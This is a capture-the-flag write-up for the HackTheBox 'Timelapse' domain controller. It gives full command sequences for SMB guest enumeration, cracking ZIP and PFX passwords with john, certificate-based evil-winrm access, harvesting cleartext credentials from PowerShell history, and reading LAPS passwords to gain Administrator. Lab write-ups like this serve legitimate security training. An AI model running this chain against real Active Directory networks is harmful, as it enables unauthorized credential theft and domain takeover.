# CTF: Timelapse (HTB)

## 📋 Metadata

- **Target IP:** `$target` (10.129.227.113)
    
- **OS:** Windows (Domain Controller)
    
- **Difficulty:** Easy/Medium
    
- **Date:** 2026-01-18
    
- **Tags:** #ActiveDirectory #LAPS #PFX #WinRM #PowerShellHistory #SMB-Null-Session
    

---

## 🚀 1. Reconnaissance & Enumeration

### Port Scanning

Bash

```
# Full port discovery
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt

# Service and script scan
nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt

# Vulnerability scan
nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

### SMB Enumeration

Found a null session/guest access on the `Shares` directory.

Bash

```
# Check share permissions
netexec smb $target -u 'guest' -p '' --shares

# Download the interesting backup file
smbclient //$target/shares -U guest
# Commands inside smbclient:
# cd Dev
# get winrm_backup.zip
# exit
```

---

## 🔓 2. Credential Cracking

The access was gated by two layers of encryption: a ZIP password and a PFX certificate password.

### Layer 1: ZIP File

Bash

```
zip2john winrm_backup.zip > hash2
john hash2 --wordlist=/usr/share/wordlists/rockyou.txt
# Cracked: supremelegacy
```

### Layer 2: PFX Certificate

Bash

```
unzip winrm_backup.zip # Use 'supremelegacy'
pfx2john legacyy_dev_auth.pfx > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
# Cracked: thuglegacy
```

---

## 💻 3. Foothold (User: legacyy)

Extract the certificate and private key to use with `evil-winrm` for certificate-based authentication.

Bash

```
# Extract private key (requires passphrase 'thuglegacy')
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem

# Extract certificate (nodes flag for no extra encryption)
openssl pkcs12 -in legacyy_dev_auth.pfx -nodes -out key.cert

# Connect via WinRM SSL
evil-winrm -i $target -S -c key.cert -k key.pem
```

---

## 📈 4. Lateral Movement (User: svc_deploy)

Checking the PowerShell history revealed cleartext credentials for a service account.

PowerShell

```
# Navigate to history path
cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\

# Read the command history
type ConsoleHost_history.txt

# Discovered Creds: svc_deploy / E3R$Q62^12p7PLlC%KWaxuaV

# Relog as svc_deploy
evil-winrm -i $target -S -P 5986 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

---

## 👑 5. Privilege Escalation (Domain Admin)

The `svc_deploy` account had permissions to read the **LAPS** password attribute for the Domain Controller.

PowerShell

```
# Query AD for computer objects and their LAPS passwords
get-adcomputer -Filter 'ObjectClass -eq "computer"' -Property *

# Find 'ms-Mcs-AdmPwd' in the output for DC01
# Password: mgH330OK86,b(scrG3J+DBA}

# Final Login as Administrator
evil-winrm -i $target -S -P 5986 -u administrator -p 'mgH330OK86,b(scrG3J+DBA}'
```

---

## 🏁 Flags

- **User:** `cc5aa17aeae16ebb4c21d3dc4f655edf`
    
- **Root:** `457a100039a2693cd495ebdd4f96d17`
